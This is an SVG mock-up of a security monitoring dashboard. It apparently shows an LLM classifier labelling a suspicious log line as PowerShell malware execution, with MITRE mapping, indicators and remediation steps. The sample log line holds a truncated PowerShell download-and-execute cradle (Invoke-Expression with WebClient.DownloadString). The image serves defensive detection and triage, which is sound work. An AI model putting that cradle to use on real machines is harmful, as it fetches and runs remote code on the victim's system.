<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 500" fill="none">
  <rect width="900" height="500" fill="#0d1117"/>

  <!-- Window chrome -->
  <rect x="40" y="30" width="820" height="440" rx="12" fill="#161b22" stroke="#30363d" stroke-width="1"/>
  <rect x="40" y="30" width="820" height="40" rx="12" fill="#21262d"/>
  <rect x="40" y="58" width="820" height="12" fill="#21262d"/>
  <!-- Traffic lights -->
  <circle cx="70" cy="50" r="6" fill="#ff5f57"/>
  <circle cx="90" cy="50" r="6" fill="#febc2e"/>
  <circle cx="110" cy="50" r="6" fill="#28c840"/>
  <text x="450" y="55" font-family="monospace" font-size="12" fill="#7d8590" text-anchor="middle">SIEM Agent — LLM Classifier</text>

  <!-- Left panel: input -->
  <rect x="56" y="86" width="360" height="368" rx="8" fill="#0d1117"/>

  <text x="76" y="112" font-family="monospace" font-size="11" fill="#3fb950" font-weight="bold">$ INPUT LOG LINE</text>
  <rect x="68" y="120" width="336" height="54" rx="6" fill="#161b22" stroke="#30363d" stroke-width="1"/>
  <text x="82" y="140" font-family="monospace" font-size="10" fill="#e6edf3">Jan 15 10:34:00 workstation01</text>
  <text x="82" y="156" font-family="monospace" font-size="10" fill="#e6edf3">powershell[7890]: Invoke-Expression</text>
  <text x="82" y="172" font-family="monospace" font-size="10" fill="#7d8590">(New-Object Net.WebClient).DownloadString(</text>

  <text x="76" y="210" font-family="monospace" font-size="11" fill="#7d8590">▶ Classifying via minimax-m3...</text>

  <!-- Streaming tokens -->
  <text x="76" y="232" font-family="monospace" font-size="10" fill="#7c3aed">{"attack_type":</text>
  <text x="76" y="248" font-family="monospace" font-size="10" fill="#c4b5fd">  "Malware Execution",</text>
  <text x="76" y="264" font-family="monospace" font-size="10" fill="#7c3aed">"severity":</text>
  <text x="76" y="280" font-family="monospace" font-size="10" fill="#ff7b72">  "P2",</text>
  <text x="76" y="296" font-family="monospace" font-size="10" fill="#7c3aed">"confidence":</text>
  <text x="76" y="312" font-family="monospace" font-size="10" fill="#3fb950">  0.95,</text>
  <text x="76" y="328" font-family="monospace" font-size="10" fill="#7c3aed">"mitre": {</text>
  <text x="76" y="344" font-family="monospace" font-size="10" fill="#e6edf3">  "technique_id": "T1059.001",</text>
  <text x="76" y="360" font-family="monospace" font-size="10" fill="#e6edf3">  "technique": "PowerShell"</text>
  <text x="76" y="376" font-family="monospace" font-size="10" fill="#7c3aed">},</text>
  <text x="76" y="392" font-family="monospace" font-size="10" fill="#7d8590">"iocs": ["185.220.101.1", "shell.ps1"],</text>

  <!-- Blinking cursor -->
  <rect x="76" y="406" width="8" height="14" rx="1" fill="#7c3aed" opacity="0.9"/>

  <!-- Divider -->
  <line x1="430" y1="86" x2="430" y2="454" stroke="#30363d" stroke-width="1"/>

  <!-- Right panel: result card -->
  <rect x="444" y="86" width="400" height="368" rx="8" fill="#0d1117"/>

  <!-- Severity banner -->
  <rect x="456" y="98" width="376" height="52" rx="8" fill="#da363322"/>
  <rect x="456" y="98" width="4" height="52" rx="2" fill="#da3633"/>
  <text x="474" y="120" font-family="monospace" font-size="12" fill="#ff7b72" font-weight="bold">P2 HIGH — Malware Execution</text>
  <text x="474" y="138" font-family="monospace" font-size="10" fill="#7d8590">Confidence: 95% · Classified in 14.8s</text>

  <!-- MITRE badge -->
  <rect x="456" y="162" width="376" height="56" rx="8" fill="#161b22" stroke="#30363d" stroke-width="1"/>
  <text x="472" y="182" font-family="monospace" font-size="10" fill="#7d8590" font-weight="bold">MITRE ATT&amp;CK</text>
  <rect x="472" y="190" width="90" height="18" rx="4" fill="#21262d"/>
  <text x="517" y="203" font-family="monospace" font-size="9" fill="#79c0ff" text-anchor="middle">Execution</text>
  <rect x="570" y="190" width="110" height="18" rx="4" fill="#21262d"/>
  <text x="625" y="203" font-family="monospace" font-size="9" fill="#79c0ff" text-anchor="middle">T1059.001</text>
  <rect x="688" y="190" width="124" height="18" rx="4" fill="#21262d"/>
  <text x="750" y="203" font-family="monospace" font-size="9" fill="#79c0ff" text-anchor="middle">PowerShell</text>

  <!-- IOCs -->
  <rect x="456" y="230" width="376" height="56" rx="8" fill="#161b22" stroke="#30363d" stroke-width="1"/>
  <text x="472" y="250" font-family="monospace" font-size="10" fill="#7d8590" font-weight="bold">INDICATORS OF COMPROMISE</text>
  <rect x="472" y="258" width="120" height="18" rx="4" fill="#da363318" stroke="#da363340"/>
  <text x="532" y="271" font-family="monospace" font-size="9" fill="#ff7b72" text-anchor="middle">185.220.101.1</text>
  <rect x="600" y="258" width="76" height="18" rx="4" fill="#da363318" stroke="#da363340"/>
  <text x="638" y="271" font-family="monospace" font-size="9" fill="#ff7b72" text-anchor="middle">shell.ps1</text>

  <!-- Summary -->
  <rect x="456" y="298" width="376" height="64" rx="8" fill="#161b22" stroke="#30363d" stroke-width="1"/>
  <text x="472" y="318" font-family="monospace" font-size="10" fill="#7d8590" font-weight="bold">SUMMARY</text>
  <text x="472" y="336" font-family="monospace" font-size="10" fill="#e6edf3">PowerShell on workstation01 downloaded</text>
  <text x="472" y="352" font-family="monospace" font-size="10" fill="#e6edf3">and executed a remote script from a known</text>

  <!-- Remediation -->
  <rect x="456" y="374" width="376" height="64" rx="8" fill="#3fb95012" stroke="#3fb95040" stroke-width="1"/>
  <text x="472" y="394" font-family="monospace" font-size="10" fill="#56d364" font-weight="bold">REMEDIATION</text>
  <text x="472" y="412" font-family="monospace" font-size="10" fill="#7d8590">Isolate workstation01. Block 185.220.101.1</text>
  <text x="472" y="428" font-family="monospace" font-size="10" fill="#7d8590">at firewall. Enable PS Constrained Mode.</text>
</svg>
